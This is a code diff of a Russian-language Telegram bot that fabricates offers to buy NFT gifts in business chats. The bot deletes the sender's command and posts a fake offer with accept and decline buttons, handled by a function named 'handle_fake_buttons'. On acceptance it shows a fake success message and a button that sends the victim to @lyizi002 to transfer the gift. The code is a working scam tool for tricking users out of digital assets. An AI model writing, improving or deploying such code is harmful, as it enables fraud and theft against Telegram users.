@@ -13,7 +13,6 @@ dp = Dispatcher()
 active_users = set()
 ADMIN_ID = None 
 
-# --- ОБНОВЛЕННЫЕ СЛОВАРИ С НОВЫМ ПОЛУЧАТЕЛЕМ @lyizi002 ---
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
@@ -53,20 +52,86 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
+# --- ФУНКЦИЯ ДЛЯ ГЛАВНОГО МЕНЮ ---
+def get_main_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📖 Как создать оффер?", callback_data="menu_help")],
+        [InlineKeyboardButton(text="🌐 Языки", callback_data="menu_langs"), InlineKeyboardButton(text="💰 Валюты", callback_data="menu_currencies")],
+        [InlineKeyboardButton(text="🔑 Получить доступ", callback_data="menu_access")]
+    ])
+
+# --- КОМАНДЫ /start И /menu ---
 @dp.message(CommandStart())
+@dp.message(Command("menu"))
 async def cmd_start(message: types.Message):
     global ADMIN_ID
     ADMIN_ID = message.from_user.id 
+    
     text = (
-        "<b>Как начать:</b>\n"
-        "Отправь /ofteam — и доступ будет выдан.\n\n"
-        "<b>Формат оффера:</b>\n"
-        "<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
-        "Валюты: stars / gram\n"
-        "Языки: ru / en / ua / ar"
+        "👋 <b>Добро пожаловать в NFT Offer Bot!</b>\n\n"
+        "Здесь вы можете создавать реалистичные визуальные офферы для NFT-подарков.\n\n"
+        "<i>Выберите нужный раздел в меню ниже:</i>"
     )
-    await message.answer(text, parse_mode="HTML")
+    await message.answer(text, reply_markup=get_main_menu(), parse_mode="HTML")
 
+# --- ОБРАБОТЧИКИ МЕНЮ ---
+@dp.callback_query(F.data == "menu_help")
+async def cb_menu_help(callback: types.CallbackQuery):
+    text = (
+        "<b>📖 Инструкция по созданию оффера:</b>\n\n"
+        "1. Подключите бота в «Автоматизацию чатов».\n"
+        "2. Отправьте команду в деловой чат:\n"
+        "<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
+        "<b>Пример:</b>\n"
+        "<code>/of https://t.me/nft/DurovsCap-1234 500 stars ru</code>"
+    )
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
+    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
+
+@dp.callback_query(F.data == "menu_langs")
+async def cb_menu_langs(callback: types.CallbackQuery):
+    text = (
+        "<b>🌐 Доступные языки:</b>\n\n"
+        "🇷🇺 <code>ru</code> — Русский\n"
+        "🇬🇧 <code>en</code> — English\n"
+        "🇺🇦 <code>ua</code> — Українська\n"
+        "🇸🇦 <code>ar</code> — العربية (Арабский)\n\n"
+        "<i>Пример: /of ССЫЛКА 500 stars en</i>"
+    )
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
+    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
+
+@dp.callback_query(F.data == "menu_currencies")
+async def cb_menu_currencies(callback: types.CallbackQuery):
+    text = (
+        "<b>💰 Доступные валюты:</b>\n\n"
+        "⭐ <code>stars</code> — Звёзды Telegram\n"
+        "💎 <code>gram</code> — Gram (TON)\n\n"
+        "<i>Пример: /of ССЫЛКА 10 gram ru</i>"
+    )
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
+    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
+
+@dp.callback_query(F.data == "menu_access")
+async def cb_menu_access(callback: types.CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id in active_users:
+        await callback.answer("✅ Доступ уже активен. Можно отправлять оферы.", show_alert=True)
+    else:
+        active_users.add(user_id)
+        await callback.answer("✅ Доступ выдан. Теперь можно отправлять оферы.", show_alert=True)
+
+@dp.callback_query(F.data == "menu_back")
+async def cb_menu_back(callback: types.CallbackQuery):
+    text = (
+        "👋 <b>Добро пожаловать в NFT Offer Bot!</b>\n\n"
+        "Здесь вы можете создавать реалистичные визуальные офферы для NFT-подарков.\n\n"
+        "<i>Выберите нужный раздел в меню ниже:</i>"
+    )
+    await callback.message.edit_text(text, reply_markup=get_main_menu(), parse_mode="HTML")
+
+
+# --- КОМАНДА /ofteam (ОСТАВЛЯЕМ ДЛЯ СОВМЕСТИМОСТИ) ---
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
     user_id = message.from_user.id
@@ -80,6 +145,7 @@ async def cmd_ofteam(message: types.Message):
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
+# --- ГЕНЕРАЦИЯ ОФФЕРА ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -111,7 +177,6 @@ async def handle_offer_command(message: types.Message):
     caption_text = msg_data["offer"].format(username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
 
     try:
-        # Мгновенно удаляем команду
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
 
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
@@ -119,7 +184,6 @@ async def handle_offer_command(message: types.Message):
             InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
         ]])
 
-        # Отправляем текст с нативной анимацией от ссылки
         await bot.send_message(
             chat_id=message.chat.id,
             text=caption_text,
@@ -159,7 +223,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
 
         if action == "accept":
             new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
-            # Кнопка ведет на нового получателя @lyizi002
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/lyizi002")]
             ])
@@ -167,7 +230,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
             new_keyboard = None
 
-        # Отправляем новое сообщение с анимацией
         kwargs = {
             "chat_id": callback.message.chat.id, 
             "text": new_text, 
